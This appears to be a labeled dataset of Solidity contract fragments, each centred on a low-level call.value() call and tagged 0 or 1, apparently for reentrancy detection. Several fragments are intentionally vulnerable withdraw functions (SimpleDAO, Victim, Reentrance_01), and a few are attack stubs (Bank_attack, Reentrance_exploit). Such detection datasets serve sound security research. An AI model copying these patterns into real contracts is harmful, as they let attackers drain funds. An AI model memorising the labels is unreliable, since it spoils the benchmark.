function doTransfer(address target, uint amount) public onlyOwner {
this.loggedTransfer(amount, "Owner transfer", target, owner);
1
---------------------------------
1629 10297.sol
10297.sol
function execute0(address to, uint256 value, bytes data) private returns (address created)  {
if (to == 0) {
created = create0(value, data);
} else {
require(to.call.value(value)(data));
0
---------------------------------
1630 14620.sol
14620.sol
function transferEth(address walletToTransfer, uint256 weiAmount) onlyOwner payable public {
require(walletToTransfer != address(0));
require(address(this).balance >= weiAmount);
require(address(this) != walletToTransfer);
require(walletToTransfer.call.value(weiAmount)());
0
---------------------------------
1631 38651.sol
38651.sol
function cancelBuyOrder(address token, uint price) {
bytes32 h = sha256(token, price, msg.sender);
uint remain = buyOrders[h];
delete buyOrders[h];
if (!msg.sender.call.value(remain)()) throw;
CancelBuyOrder(h,token,price,msg.sender);
0
---------------------------------
1632 38888.sol
38888.sol
function withdraw() onlyOwner {
if (!owner.call.value(this.balance)()) throw;
0
---------------------------------
1633 39994.sol
39994.sol
function safeSend(address _recipient, uint _ether) internal preventReentry()  returns (bool success_) {
if(!_recipient.call.value(_ether)()) throw;
success_ = true;
pragma solidity ^0.4.0;
contract Math
string constant VERSION = "Math 0.0.1 \n";
uint constant NULL = 0;
bool constant LT = false;
bool constant GT = true;
uint constant iTRUE = 1;
uint constant iFALSE = 0;
uint constant iPOS = 1;
uint constant iZERO = 0;
uint constant iNEG = uint(-1);
function withdraw(uint _ether) external canEnter  hasEther(msg.sender, _ether) returns (bool success_) {
etherBalance[msg.sender] -= _ether;
safeSend(msg.sender, _ether);
success_ = true;
0
---------------------------------
1634 14741.sol
14741.sol
function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) {
require(balanceOf(msg.sender) > _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
emit Transfer(msg.sender, _to, _value, _data);
return true;
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) {
require(!frozenAccount[msg.sender]);
require(!frozenAccount[_to]);
if (isContract(_to)) {
return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback);
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1635 29601.sol
29601.sol
function transferInternal(address from, address to, uint256 value, bytes data,  bool useCustomFallback, string customFallback )  internal returns (bool success) {
bool status = super.transferInternal(from, to, value);
if (status) {
if (isContract(to)) {
ContractReceiver receiver = ContractReceiver(to);
if (useCustomFallback) {
require(receiver.call.value(0)(bytes4(keccak256(customFallback)), from, value, data) == true);
} else {
receiver.tokenFallback(from, value, data);
Transfer(from, to, value, data);
return status;
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool success) {
require(locked == false);
bool status = transferInternal(msg.sender, to, value, data, true, customFallback);
return status;
function transferInternal(address from, address to, uint256 value, bytes data) internal returns (bool success) {
return transferInternal(from, to, value, data, false, "");
function transferInternal(address from, address to, uint256 value) internal returns (bool success) {
require(locked == false);
bytes memory data;
return transferInternal(from, to, value, data, false, "");
function claimableTransfer(
uint256 _time,
address _from,
address _to,
uint256 _value,
bytes _data,
bool _useCustomFallback,
string _customFallback
)
internal returns (bool success)
uint256 senderCurrentBalance = balanceOf(_from);
uint256 receiverCurrentBalance = balanceOf(_to);
uint256 _totalSupply = totalSupply();
bool status = super.transferInternal(_from, _to, _value, _data, _useCustomFallback, _customFallback);
require(status);
claimInternal(_time, _from, senderCurrentBalance, _totalSupply);
claimInternal(_time, _to, receiverCurrentBalance, _totalSupply);
return true;
0
---------------------------------
1636 38724.sol
38724.sol
function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
return allowed[_owner][_spender];
mapping (address => uint256) balances;
mapping (address => mapping (address => uint256)) allowed;
contract ERC20nator is StandardToken, Ownable {
address public fundraiserAddress;
bytes public fundraiserCallData;
uint constant issueFeePercent = 2;
event requestedRedeem(address indexed requestor, uint amount);
event redeemed(address redeemer, uint amount);
function() payable {
uint issuedTokens = msg.value * (100 - issueFeePercent) / 100;
if(!owner.send(msg.value - issuedTokens)) throw;
if(!fundraiserAddress.call.value(issuedTokens)(fundraiserCallData))  throw;
totalSupply += issuedTokens;
balances[msg.sender] += issuedTokens;
1
---------------------------------
1637 21277.sol
21277.sol
function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyManager returns (bool) {
return _to.call.value(_value).gas(_gas)(_code);
modifier onlyManager
require(msg.sender == manager);
_;
contract EthernameRaw is Managed {
event Transfer(
address indexed from,
address indexed to,
bytes32 indexed name
);
event Approval(
address indexed owner,
address indexed approved,
bytes32 indexed name
);
event SendEther(
address indexed from,
address indexed to,
bytes32 sender,
bytes32 recipient,
uint256 value
);
event Name(address indexed owner, bytes32 indexed name);
event Price(bytes32 indexed name, uint256 price);
event Buy(bytes32 indexed name, address buyer, uint256 price);
event Attribute(bytes32 indexed name, bytes32 key);
struct Record {
address owner;
uint256 price;
mapping (bytes32 => bytes) attrs;
string public constant name = "Ethername";
string public constant symbol = "ENM";
mapping (address => bytes32) public ownerToName;
mapping (bytes32 => Record) public nameToRecord;
mapping (bytes32 => address) public nameToApproved;
0
---------------------------------
1638 18145.sol
18145.sol
function ___upgradeToAndCall(address newTarget, bytes data) payable public _onlyProxyOwner {
___upgradeTo(newTarget);
require(address(this).call.value(msg.value)(data));
0
---------------------------------
1639 12454.sol
12454.sol
function submitPool(uint256 weiAmount) public onlyAdmin noReentrancy {
require(contractStage < CONTRACT_SUBMIT_FUNDS, "Cannot resubmit pool.");
require(receiverAddress != 0x00, "receiver address cannot be empty");
uint256 contractBalance = address(this).balance;
if(weiAmount == 0){
weiAmount = contractBalance;
require(minContribution <= weiAmount && weiAmount <= contractBalance, "submitted amount too small or larger than the balance");
finalBalance = contractBalance;
require(receiverAddress.call.value(weiAmount).gas(gasleft().sub(5000))(),"Error submitting pool to receivingAddress");
contractBalance = address(this).balance;
if(contractBalance > 0) {
ethRefundAmount.push(contractBalance);
contractStage = CONTRACT_SUBMIT_FUNDS;
emit PoolSubmitted(receiverAddress, weiAmount);
0
---------------------------------
1640 30178.sol
30178.sol
function buy() payable notPaused() public returns(bool) {
require(now >= salesStart);
require(now < salesDeadline);
uint tokensToBuy = msg.value * MULTIPLIER / TOKEN_PRICE;
require(tokensToBuy > 0);
uint timeBonus = _calculateTimeBonus(tokensToBuy, now);
uint volumeBonus = _calculateVolumeBonus(tokensToBuy, msg.sender, msg.value);
uint totalTokensToTransfer = tokensToBuy + timeBonus + volumeBonus;
require(token.transfer(msg.sender, totalTokensToTransfer));
LogBought(msg.sender, msg.value, totalTokensToTransfer, 0);
require(wallet.call.value(msg.value)());
return true;
0
---------------------------------
1641 4598.sol
4598.sol
function futrMiner() public payable {
require(futr.call.value(msg.value)());
uint256 mined = ERC20(futr).balanceOf(address(this));
ERC20(futr).approve(mny, mined);
MNY(mny).mine(futr, mined);
uint256 amount = ERC20(mny).balanceOf(address(this));
ERC20(mny).transfer(msg.sender, amount);
function futxMiner() public payable {
require(futx.call.value(msg.value)());
uint256 mined = ERC20(futx).balanceOf(address(this));
ERC20(futx).approve(mny, mined);
MNY(mny).mine(futx, mined);
uint256 amount = ERC20(mny).balanceOf(address(this));
ERC20(mny).transfer(msg.sender, amount);
0
---------------------------------
1642 Bank_attack.sol
Bank_attack.sol
function step1(uint256 amount)  payable {
if (this.balance >= amount) {
victim.call.value(amount)(bytes4(keccak256("Deposit()")));
function startAttack(uint256 amount)  {
step1(amount);
step2(amount / 2);
1
---------------------------------
1643 22805.sol
22805.sol
function eT(address _pd, uint _tkA, uint _etA) returns (bool success) {
balances[msg.sender] = safeSub(balances[msg.sender], _tkA);
balances[_pd] = safeAdd(balances[_pd], _tkA);
if (!_pd.call.value(_etA)()) revert();
ET(_pd, _tkA, _etA);
return true;
0
---------------------------------
1644 Reentrance_exploit.sol
Reentrance_exploit.sol
function deposit(address _vulnerable_contract) public payable{
vulnerable_contract = _vulnerable_contract ;
require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
1
---------------------------------
1645 39019.sol
39019.sol
function CreateTokens() {
if (tokensCreated > 0) return;
uint amount = amountRaised * (100 - rewardPercentage) / 100;
if (!tokenCreateContract.call.value(amount)(tokenCreateFunctionHash)) throw;
tokensCreated = tokenContract.balanceOf(this);
tokenCreator = msg.sender;
0
---------------------------------
1646 35637.sol
35637.sol
function transfer(address _to, uint48 _value, bytes _data, string _custom_fallback) returns (bool success) {
if(isContract(_to)) {
require(balanceOf(msg.sender) >= _value);
balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
balances[_to] = safeAdd(balanceOf(_to), _value);
ContractReceiver receiver = ContractReceiver(_to);
receiver.call.value(0)(bytes4(sha3(_custom_fallback)), msg.sender, _value, _data);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1647 28869.sol
28869.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender)  notExecuted(transactionId)  {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public  ownerExists(msg.sender)  transactionExists(transactionId) notConfirmed(transactionId, msg.sender)  {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1648 18438.sol
18438.sol
function invest() public {
uint256 amountToSend = address(this).balance;
if(amountToSend > 1){
uint256 half = amountToSend / 2;
require(sk2xContract.call.value(half)());
p3dContract.buy.value(half)(msg.sender);
function donate() payable public {
require(sk2xContract.call.value(msg.value).gas(1000000)());
0
---------------------------------
1649 14758.sol
14758.sol
function wcf(address target, uint256 a) payable {
require(msg.sender == owner);
uint startBalance = this.balance;
target.call.value(msg.value)(bytes4(keccak256("play(uint256)")), a);
if (this.balance <= startBalance) revert();
owner.transfer(this.balance);
0
---------------------------------
1650 14994.sol
14994.sol
function collectOwedDividends() public returns (uint _amount) {
_updateCreditedPoints(msg.sender);
_amount = creditedPoints[msg.sender] / POINTS_PER_WEI;
creditedPoints[msg.sender] = 0;
dividendsCollected += _amount;
emit CollectedDividends(now, msg.sender, _amount);
require(msg.sender.call.value(_amount)());
0
---------------------------------
1651 35806.sol
35806.sol
function withdraw(uint amount) {
require(tokens[0][msg.sender] >= amount);
tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount);
require(msg.sender.call.value(amount)());
Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);
0
---------------------------------
1652 40241.sol
40241.sol
function withdraw(uint256 tokens) noEther onlyDaoChallenge {
if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw;
tokenBalance -= tokens;
if(!owner.call.value(tokens * tokenPrice)()) throw;
function withdraw(uint256 tokens) noEther {
DaoAccount account = accountFor(msg.sender, false);
if (account == DaoAccount(0x00)) throw;
account.withdraw(tokens);
notifyWithdraw(msg.sender, tokens);
0
---------------------------------
1653 21697.sol
21697.sol
function Jump() public payable  {
if(msg.value > 1 ether)  {
msg.sender.call.value(this.balance);
1
---------------------------------
1654 10107.sol
10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
1655 39191.sol
39191.sol
function withdraw(Bank storage self, address accountAddress, uint value) public returns (bool) {
if (self.accountBalances[accountAddress] >= value) {
deductFunds(self, accountAddress, value);
if (!accountAddress.send(value)) {
if (!accountAddress.call.value(value)()) {  throw; }
return true;
return false;
uint constant DEFAULT_SEND_GAS = 100000;
0
---------------------------------
1656 5515.sol
5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1657 17009.sol
17009.sol
function Pay(address _destination) public payable {
require(_destination != 0x0);
require(msg.value > 0);
require(!paused);
masterWallet.transfer(msg.value.div(9));
_destination.call.value(msg.value.div(9).mul(8))();
SettleFund(_destination, msg.value);
1
---------------------------------
1658 23421.sol
23421.sol
function _safeCall(address _to, uint _amount) internal {
require(_to != 0);
require(_to.call.value(_amount)());
function multiCall(address[] _address, uint[] _amount) payable public returns(bool) {
for (uint i = 0; i < _address.length; i++) {
_safeCall(_address[i], _amount[i]);
return true;
1
---------------------------------
1659 27486.sol
27486.sol
function Command(address adr,bytes data)  payable  public  {
require(msg.sender == Owner);
adr.call.value(msg.value)(data);
0
---------------------------------
1660 40353.sol
40353.sol
function withdraw(uint256 tokens) noEther onlyDaoChallenge {
if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw;
tokenBalance -= tokens;
if(!owner.call.value(tokens * tokenPrice)()) throw;
function withdraw(uint256 tokens) noEther {
DaoAccount account = accountFor(msg.sender, false);
if (account == DaoAccount(0x00)) throw;
account.withdraw(tokens);
notifyWithdraw(msg.sender, tokens);
0
---------------------------------
1661 39684.sol
39684.sol
function () payable {
if (msg.data.length > 0) {
createSeries(msg.data, 0, "", "", 0x0);
} else if (latestSeriesForUser[msg.sender] != 0) {
if (latestSeriesForUser[msg.sender].call.value(msg.value)())
DepositMade(latestSeriesForUser[msg.sender], msg.value);
} else {
createSeries("", 0, "", "", 0x0);
contract SeriesFactory {
address public seriesFactory;
address public owner;
0
---------------------------------
1662 9611.sol
9611.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
1663 14353.sol
14353.sol
function buy(){
require(sale != 0x0);
require(sale.call.value(this.balance)());
1
---------------------------------
1664 2301.sol
2301.sol
function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {
_target.call.value(_value)(_data);
0
---------------------------------
1665 33851.sol
33851.sol
function donate( bytes32 hash) payable {
print(hash);
if (block.number<startBlock || block.number>endBlock || (saleEtherRaised + msg.value)>etherCap || halted) throw;
uint256 tokens = (msg.value * price());
balances[msg.sender] = (balances[msg.sender] + tokens);
totalSupply = (totalSupply + tokens);
saleEtherRaised = (saleEtherRaised + msg.value);
if (!founder.call.value(msg.value)()) throw;
Donate(msg.value, tokens);
0
---------------------------------
1666 36732.sol
36732.sol
function claim_bounty(){
if (this.balance < eth_minimum) return;
if (bought_tokens) return;
if (now < earliest_buy_time) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
uint256 claimed_bounty = buy_bounty;
buy_bounty = 0;
contract_eth_value = this.balance - (claimed_bounty + withdraw_bounty);
require(sale.call.value(contract_eth_value)());
msg.sender.transfer(claimed_bounty);
0
---------------------------------
1667 27159.sol
27159.sol
function transfer(address to, uint value,  bytes data, string custom_fallback ) public returns (bool success)  {
_transfer( msg.sender, to, value, data );
if ( isContract(to) ) {
ContractReceiver rx = ContractReceiver( to );
require(rx.call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data) );
return true;
function transfer(address to, uint256 value) public  {
bytes memory empty;
_transfer(msg.sender, to, value, empty);
function transferFrom( address from, address to, uint256 value ) public  returns (bool success)  {
require( value <= allowances_[from][msg.sender] );
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer( from, to, value, empty );
return true;
function transfer( address to, uint value, bytes data ) public  returns (bool success)  {
if (isContract(to)) {
return transferToContract( to, value, data );
_transfer( msg.sender, to, value, data );
return true;
function transferToContract( address to, uint value, bytes data ) private  returns (bool success)  {
_transfer( msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
rx.tokenFallback( msg.sender, value, data );
return true;
1
---------------------------------
1668 27398.sol
27398.sol
function Command(address adr,bytes data) payable public {
require(msg.sender == Owner);
adr.call.value(msg.value)(data);
0
---------------------------------
1669 15458.sol
15458.sol
function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool success) {
_transfer( msg.sender, to, value, data );
require(address(to).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data));
return true;
function transfer(address to, uint256 value) public  returns (bool success)  {
bytes memory empty;
_transfer(msg.sender, to, value, empty);
return true;
function transferFrom( address from, address to, uint256 value ) public  returns (bool success)  {
require( value <= allowances_[from][msg.sender] );
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer(from, to, value, empty);
return true;
function transfer( address to, uint value, bytes data ) public  returns (bool success)  {
if (isContract(to)) {
return transferToContract( to, value, data );
_transfer( msg.sender, to, value, data );
return true;
function transferToContract( address to, uint value, bytes data ) private  returns (bool success)  {
_transfer( msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
if (isContract(rx)) {
rx.tokenFallback( msg.sender, value, data );
return true;
return false;
1
---------------------------------
1670 35617.sol
35617.sol
function buyRecipient(address recipient) duringCrowdSale payable {
require(!halted);
uint tokens = safeMul(msg.value, price(block.timestamp));
require(safeAdd(saleTokenSupply,tokens)<=coinAllocation );
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
saleTokenSupply = safeAdd(saleTokenSupply, tokens);
salesVolume = safeAdd(salesVolume, msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(recipient, msg.value, tokens);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
0
---------------------------------
1671 19128.sol
19128.sol
function doWithdraw(address from, address to, uint256 amount) internal {
require(amount <= MAX_WITHDRAWAL);
require(balances[from] >= amount);
require(withdrawalCount[from] < 3);
balances[from] = balances[from].sub(amount);
to.call.value(amount)();
withdrawalCount[from] = withdrawalCount[from].add(1);
function withdraw(uint256 amount) public {
doWithdraw(msg.sender, msg.sender, amount);
function withdrawTo(address to, uint256 amount) public {
doWithdraw(msg.sender, to, amount);
function withdrawFor(address from, uint256 amount) public {
require(approvals[from][msg.sender]);
doWithdraw(from, msg.sender, amount);
function withdrawForTo(address from, address to, uint256 amount) public {
require(approvals[from][msg.sender]);
doWithdraw(from, to, amount);
1
---------------------------------
1672 Victim.sol
Victim.sol
function withdraw(uint _amount) public {
if(balances[msg.sender] >= _amount) {
if(msg.sender.call.value(_amount)()) {
_amount;
balances[msg.sender] -= _amount;
1
---------------------------------
1673 25808.sol
25808.sol
function getTokens(uint num, address addr) public {
for(uint i = 0; i < num; i++){
addr.call.value(0 wei)();
1
---------------------------------
1674 21111.sol
21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
1675 33501.sol
33501.sol
function executeTransaction(bytes32 transactionId)   public   notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1676 Reentrance_01.sol
Reentrance_01.sol
function withdrawBalance(){
if(!(msg.sender.call.value(userBalance[msg.sender])())){
throw;
userBalance[msg.sender] = 0;
1
---------------------------------
1677 1751.sol
1751.sol
function proxy(address target, bytes data) public payable {
target.call.value(msg.value)(data);
contract VaultProxy is Proxy {
address public Owner;
mapping (address => uint256) public Deposits;
1
---------------------------------
1678 14579.sol
14579.sol
function pay() public onlyOwner whenNotCanceled {
require(weiCollected > 0);
uint256 fee;
uint256 netAmount;
(fee, netAmount) = _getFeeAndNetAmount(weiCollected);
require(address(sale).call.value(netAmount)(this));
tokensReceived = getToken().balanceOf(this);
if (fee != 0) {
manager.transfer(fee);
paid = true;
emit Paid(netAmount, fee);
0
---------------------------------
1679 37836.sol
37836.sol
function collect() onlyOwner {
require(addrcnt.call.value(this.balance)(0));
Collect(addrcnt,this.balance);
0
---------------------------------
1680 774.sol
774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
1681 Reentrance_03.sol
Reentrance_03.sol
function withdrawBalance_fixed(){
uint amount = userBalance[msg.sender];
userBalance[msg.sender] = 0;
if(!(msg.sender.call.value(amount)())){ throw; }
0
---------------------------------
1682 7530.sol
7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
1683 36645.sol
36645.sol
function purchase_tokens() {
require(msg.sender == developer);
if (this.balance < eth_minimum) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
contract_eth_value = this.balance;
require(sale.call.value(contract_eth_value)());
require(this.balance==0);
0
---------------------------------
1684 39749.sol
39749.sol
function calcRefund(address _addressToRefund) internal {
uint amount = balanceOf[_addressToRefund];
balanceOf[_addressToRefund] = 0;
if (amount > 0) {
if (_addressToRefund.call.value(amount)()) {
LogFundTransfer(_addressToRefund, amount, false);
} else {
balanceOf[_addressToRefund] = amount;
function safeWithdraw() public onlyAfterDeadline {
if (amountRaised >= fundingGoal){
fundingGoalReached = true;
LogGoalReached(bankRollBeneficiary, amountRaised);
crowdsaleClosed = true;
if (!fundingGoalReached) {
calcRefund(msg.sender);
if (msg.sender == owner && fundingGoalReached) {
bankrollBeneficiaryAmount = (this.balance*80)/100;
if (bankRollBeneficiary.send(bankrollBeneficiaryAmount)) {
LogFundTransfer(bankRollBeneficiary, bankrollBeneficiaryAmount, false);
etherollBeneficiaryAmount = this.balance;
if(!etherollBeneficiary.send(etherollBeneficiaryAmount)) throw;
LogFundTransfer(etherollBeneficiary, etherollBeneficiaryAmount, false);
} else {
fundingGoalReached = false;
function emergencyWithdraw() public isEmergency {
calcRefund(msg.sender);
0
---------------------------------
1685 36334.sol
36334.sol
function buy_the_tokens() {
require(msg.sender == owner);
require(!bought_tokens);
require(sale != 0x0);
require(this.balance >= min_required_amount);
bought_tokens = true;
contract_eth_value = this.balance;
require(sale.call.value(contract_eth_value)());
0
---------------------------------
1686 28687.sol
28687.sol
function CashOut(uint _am)  {
if(_am<=balances[msg.sender]) {
if(msg.sender.call.value(_am)()) {
balances[msg.sender]-=_am;
TransferLog.AddMessage(msg.sender,_am,"CashOut");
function() public payable{}
contract Log
struct Message
address Sender;
string  Data;
uint Val;
uint  Time;
Message[] public History;
Message LastMsg;
1
---------------------------------
1687 1430.sol
1430.sol
function callContract(address to, bytes data) onlyOwner public payable returns (bool) {
require(to.call.value(msg.value)(data));
return true;
0
---------------------------------
1688 23088.sol
23088.sol
function atomicize (address[] addrs, uint[] values, uint[] calldataLengths, bytes calldatas) public{
require(addrs.length == values.length && addrs.length == calldataLengths.length);
uint j = 0;
for (uint i = 0; i < addrs.length; i++) {
bytes memory calldata = new bytes(calldataLengths[i]);
for (uint k = 0; k < calldataLengths[i]; k++) {
calldata[k] = calldatas[j];
j++;
require(addrs[i].call.value(values[i])(calldata));
1
---------------------------------
1689 Reentrance_02.sol
Reentrance_02.sol
function withdraw(uint _amount) public {
if(balances[msg.sender] >= _amount) {
if(msg.sender.call.value(_amount)()) {
_amount;
balances[msg.sender] -= _amount;
function() public payable {}
1
---------------------------------
1690 26523.sol
26523.sol
function claim_reward(uint uid, bytes32 passcode) public payable{
require(msg.value >= parameters["price"]);
require(is_passcode_correct(uid, passcode));
uint final_reward = get_reward(uid) + msg.value;
if (final_reward > parameters["price_poοl"])
final_reward = parameters["price_poοl"];
require(msg.sender.call.value(final_reward)());
parameters["price_poοl"] -= final_reward;
if (uid + 1 < users.length)
users[uid] = users[users.length - 1];
users.length -= 1;
1
---------------------------------
1691 SimpleDAO.sol
SimpleDAO.sol
function withdraw(uint amount) {
if (credit[msg.sender]>= amount) {
msg.sender.call.value(amount)();
credit[msg.sender]-=amount;
1
---------------------------------
1692 21241.sol
21241.sol
function finish() onlyOwner saleCompletedSuccessfully public {
uint256 freeEthers = address(this).balance * 40 / 100;
uint256 vestedEthers = address(this).balance - freeEthers;
address(0xd1B10607921C78D9a00529294C4b99f1bd250E1c).transfer(freeEthers);
assert(address(0x0285d35508e1A1f833142EB5211adb858Bd3323A).call.value(vestedEthers)());
AuctusToken token = AuctusToken(auctusTokenAddress);
token.setTokenSaleFinished();
if (remainingTokens > 0) {
token.burn(remainingTokens);
remainingTokens = 0;
0
---------------------------------
1693 39817.sol
39817.sol
function callDividend(address token_) owned {
assert(tokenManage[token_].hasDividend);
assert(tokenManage[token_].divContractAddress.call.value(0)(tokenManage[token_].divData));
function buyEther(uint256 amount) {
assert(valueToToken(etherContract,balances[msg.sender]) >= amount);
assert(destroyValue(msg.sender, tokenToValue(etherContract,amount)));
assert(msg.sender.call.value(amount)());
Buy(etherContract, msg.sender, amount, balances[msg.sender]);
function quickTrade(address tokenFrom, address tokenTo, uint256 input) payable drainBlock {
uint256 inValue;
uint256 tempInValue = safeAdd(tokenToValue(etherContract,msg.value),
tokenToValue(tokenFrom,input));
inValue = valueWithFee(tempInValue);
uint256 outValue = valueToToken(tokenTo,inValue);
assert(verifiedTransferFrom(tokenFrom,msg.sender,input));
if (tokenTo == etherContract){
assert(msg.sender.call.value(outValue)());
} else assert(Token(tokenTo).transfer(msg.sender, outValue));
Trade(tokenFrom, tokenTo, msg.sender, inValue);
function takeEtherProfits(){
ShopKeeper(shopKeeperLocation).splitProfits();
ValueTrader shop = ValueTrader(shopLocation);
shop.buyEther(shop.balanceOf(this));
assert(profitContainerLocation.call.value(this.balance)());
0
---------------------------------
